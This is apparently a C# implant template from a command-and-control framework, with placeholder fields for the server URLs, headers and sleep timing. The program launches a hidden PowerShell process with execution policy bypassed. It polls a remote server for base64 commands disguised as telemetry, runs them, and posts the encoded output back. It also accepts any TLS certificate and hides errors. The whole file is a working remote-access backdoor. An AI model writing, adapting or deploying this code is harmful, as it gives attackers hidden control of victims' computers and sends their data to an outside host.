
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;

class Program
{

	public static void Main(string[] args)
	{
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		MainAsync(args).GetAwaiter().GetResult();
	}

	public static async Task MainAsync(string[] args)
	{
		var sid = GenerateSid();

		string getUrl  = "{{GET_URL}}";
		string postUrl = "{{POST_URL}}";

		var psi = new ProcessStartInfo {
			FileName              = "powershell.exe",
			Arguments             = "-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass",
			RedirectStandardInput = true,
			RedirectStandardOutput = true,
			RedirectStandardError = true,
			UseShellExecute       = false,
			CreateNoWindow        = true,
		};
		var ps = Process.Start(psi);
		if (ps == null) {
			return;
		}

		var outMem = new MemoryStream();
		var errMem = new MemoryStream();
		Thread tOut = new Thread(() => CopyStream(ps.StandardOutput.BaseStream, outMem)) { IsBackground = true };
		Thread tErr = new Thread(() => CopyStream(ps.StandardError.BaseStream, errMem)) { IsBackground = true };
		tOut.Start();
		tErr.Start();

		var psIn = ps.StandardInput;

		while (true)
		{

			try
			{
				var handler = new HttpClientHandler
				{
					ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
				};

				using (var client = new HttpClient(handler) { BaseAddress = new Uri(getUrl) })
				{
					var getReq = new HttpRequestMessage(HttpMethod.Get, getUrl);
					getReq.Headers.TryAddWithoutValidation("X-Session-ID", sid);
					getReq.Headers.UserAgent.ParseAdd("{{USER_AGENT}}");
					{{ACCEPT_LINE}}
					{{HOST_LINE}}
					{{RANGE_LINE}}
					{{GET_HEADERS}}

					var getResp = await client.SendAsync(getReq);
					var body = await getResp.Content.ReadAsStringAsync();

					var cmdB64 = ParseTelemetry(body);
					if (!string.IsNullOrEmpty(cmdB64))
					{
						var cmdBytes = Convert.FromBase64String(cmdB64);
						var cmdText = Encoding.UTF8.GetString(cmdBytes);

						psIn.WriteLine(cmdText);
						psIn.Flush();
					}

					Thread.Sleep(2000);

					string outRaw;
					lock (outMem)
					{
						outMem.Position = 0;
						errMem.Position = 0;
						var stdout = new StreamReader(outMem, Encoding.UTF8).ReadToEnd();
						var stderr = new StreamReader(errMem, Encoding.UTF8).ReadToEnd();
						outRaw = stdout + stderr;
						outMem.SetLength(0);
						errMem.SetLength(0);
					}

					var outBytes = Encoding.UTF8.GetBytes(outRaw);
					var outB64 = Convert.ToBase64String(outBytes);
					var json = {{POST_JSON_EXPR}};

					var postReq = new HttpRequestMessage(HttpMethod.Post, postUrl);
					postReq.Headers.UserAgent.ParseAdd("{{USER_AGENT}}");
					postReq.Content = new StringContent(json, Encoding.UTF8, "application/json");
					postReq.Headers.Add("X-Session-ID", sid);
					{{POST_HEADERS}}

					var postResp = await client.SendAsync(postReq);
					var respBody = await postResp.Content.ReadAsStringAsync();
				}
			}
			catch (Exception ex)
			{
			}

			Thread.Sleep({{SLEEP_LONG}});
		}
	}

	static void CopyStream(Stream input, Stream output)
	{
		var buffer = new byte[4096];
		int read;
		try
		{
			while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
			{
				output.Write(buffer, 0, read);
				output.Flush();
			}
		}
		catch (Exception ex)
		{
		}
	}

	static string GenerateSid()
	{
		const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
		int seed = (int)DateTime.UtcNow.Ticks ^ Process.GetCurrentProcess().Id;
		var rnd = new Random(seed);
		var sb = new StringBuilder(3 * 5 + 2);
		for (int seg = 0; seg < 3; seg++)
		{
			for (int i = 0; i < 5; i++)
				sb.Append(chars[rnd.Next(chars.Length)]);
			if (seg < 2) sb.Append('-');
		}
		return sb.ToString();
	}

	static string ParseTelemetry(string resp)
	{
		var m = Regex.Match(resp, {{PROBE_UNION}});
		if (m.Success)
		{
			return m.Groups["b64"].Value;
		} else {
			return null;
		}
		
	}
}
